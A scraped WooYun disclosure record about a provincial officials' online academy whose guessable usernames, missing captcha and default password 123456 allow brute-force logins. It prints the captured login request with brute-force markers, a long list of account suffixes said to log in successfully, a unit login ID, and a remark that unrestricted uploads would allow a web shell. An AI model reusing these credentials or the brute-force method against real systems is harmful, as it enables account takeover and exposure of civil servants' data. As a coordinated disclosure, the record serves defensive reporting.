{"id": 79505, "wybug_id": "wooyun-2015-0157986", "wybug_title": "某省干部在线学院设计逻辑缺陷（公务人员信息泄露）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "Bison", "wybug_date": "2015-12-04 11:16", "wybug_open_date": "2016-01-21 10:21", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-21：\t细节向公众公开  简要描述： RT 详细说明：  用户登录名过于简单，可猜测，无验证码，可爆破。海量公务人员信息暴露。漏洞页面：http://**.**.**.**/login.aspx\n\n抓取封包：\nPOST /login.aspx HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://**.**.**.**/login.aspxCookie: ASP.NET_SessionId=fhh2quyesxrpjldc0tfgsdlb; _gscu_1185587572=49123707z5nvfh72; _gscs_1185587572=49123707t0x35p72|pv:3; _gscbrs_1185587572=1Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 475__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKMTIyNDMwNDg5M2QYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgIFImN0bDAwJENvbnRlbnRQbGFjZUhvbGRlcjEkYnRuTG9naW4FJWN0bDAwJENvbnRlbnRQbGFjZUhvbGRlcjEkYnRuUmVnaXN0ZXLPzPYNbO5fqPdKkMaO9DHcN4nTe8scUhfJtEN%2BUQKIpw%3D%3D&__VIEWSTATEGENERATOR=C2EE9ABB&ctl00%24ContentPlaceHolder1%24txtYHM=u004§0000§&ctl00%24ContentPlaceHolder1%24txtMM=123456&ctl00%24ContentPlaceHolder1%24btnLogin.x=33&ctl00%24ContentPlaceHolder1%24btnLogin.y=12\n社工了一下，发现用户名为u开头，加7位数字即：u1234567随便胡乱输了一个用户名，密码：123456后四位为变量，开始爆破：\n\n\n\n无话可说了。。上图是成功的，还只是一部分中的一部分。。。如下：\n0016003500460058006300810082008301080110014101430144014501520177019102000211021302190234024402450250025202530254025502570259027602880294029502960313032703470349109911051117113411381139114211491157115811621164117611771201123912561273127412751276127712791281128512881312131613291330133813411343136513681373137813791388139013931397140314141416144314441445145314551456150015011519152215291556155715601562156415691588161916341641164216741676168016871689169016921693170817091711172417271740174217431754175917661777178217861788179218061817181818201821182218611869187518781936194419451966197219911995199920032004200820102011201220132018201920222023202820332034203720382073208420982106210821092113211921352152216121672169221422222228224622522272230523152317232123292337234123432345234723552357236223712376238523892391239624592461246324672469247224792486248724962515251825232546256125622565258125832590259125932598260026182620262826342639264026472654265526562658265926612669267026902691269326942698270427052707270927122732273827392742274327442745274627472767277027732782278928022803280628082809281028112816282128232827282828332836285128592860286628672870287428922915293829592980298229902996300030363038304230453046304930523053305530563059306130633066307330753077308630893143314931533157316031733179318031813182318632393262326932733275328333183321332633293335333733393341335833603362340134113435343934433446344934653470347834833492349635013503350635113523352435353537354235473561356435673572358035973619366036623664366636683670368137243725372937303731373437383742375437873794379838393853385738763878388338993910392339263927392939313937394339463948394939543955396339863990402841164123412441254127412941304138417941874189419041914192420242034208422942304231423342354236423742424243424442524255425842594262426442684269427642774281428342884294429542964303430543084309431543214347437443804383439443964421443844444447446044664471447344984501450345044505451245164521453845464547459546004607461046384646464946664667466846804683471747194733474447584764476847694770477447754777478147914792481748294830483148404850485548694881488348874888488948914892489449114922492349294952495649574958496549684975497749885035504250825084508550865094509650985100510151025104511151235125513951465150516051875190520452075208521052195224522752465258527352935295529653125322532353375340535053675382539054265446545254685473547454835499550055075514552155465548555655575558558656135616561756335650565256555673568156885690570057015705570657095710571357145727572857325746576157625763576757775778578157935795580158025803580458235828583058435846585358615867587058755877588858995907594259455946595759595962596459655968597059865991599960006013601760196021602360276034603560366039604460486050605560676068607560846085608660886094610261116117612161256136613761446150615161526153634363446345635363546356635863856386641864236424643664376440644164546459648064826487649965276528652965356538654065436552655665576562656765776586658765916592659666016607661566356640664466556657667066976699672367596763677967916793679568296832683368416843684768496854685568566876688868946895689868996901690769136914692669306935695169596961699670557080709471087127715071707172717371907191719872117258727272767278731073397350735973817386743574527455745674597497750775347539754375467559757775817588759275937604761276347677768676877689769277167732774077727782779678067821783178427852786278787881788978917937797280058011801280358036804980538067808480928094810481168122812681308142814481468178817981818197822982328253825882638266826882708273829283068311832583268327832883298331833283368337834083478348835583588361838784058411841384148415841684178423842684638478848385018527852885378538856985868587859786238624864186458654866386668687868986968697869987218778878387918797879988028822882688378853885788588860886488658867886988718884888788938908891189148917892789398960896589688970897489828989899689988999900990119014901890299045905690629068907690879089909891059107911691219133913491399147915891639166916991759181919491979202921292149217921992209239924692799298930793089316932093259327932893769377938793929393939593969401940294239453945994649472947794789479949394949497949995019504950595089509951495219522952395259526953295339537954695629594962096229634963896519681969697019702970497069738975497559760976197639775977697829787979497979800980198039807980998209840984398449861986298819885989699079908993399469954995599669973997899819985998699929998\n在以上的4位数字前加 u004即： u0049998u0040016登录进去，如下：用户名u0049998密码：123456\n\n如上图，出现学院所在单位，姓名。之后，单击选学报名：\n\n单击单位用户登陆\nhttp://**.**.**.**/yxdanweilogin.aspx\n\n\n随便复制一个左边的单位编号，在右侧输入，密码输 123456我选了一个级别大的：14000055123456\n\n\n\n可修改密码：\n\n\n\n这个。。。140000550154\t省委“610”办公室\t咳咳。好多没见过的东西啊。。。不上图了。。。对传输格式没有限制！可传shell\n\n我没传啊，没敢传。。。   漏洞证明：  \n\n\n\n可修改密码：\n\n\n\n最后我想说一句，能多给点rank么？   修复方案：  加强校验。   版权声明：转载请注明来源 Bison@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-12-08 11:06 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT下发给山西分中心,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}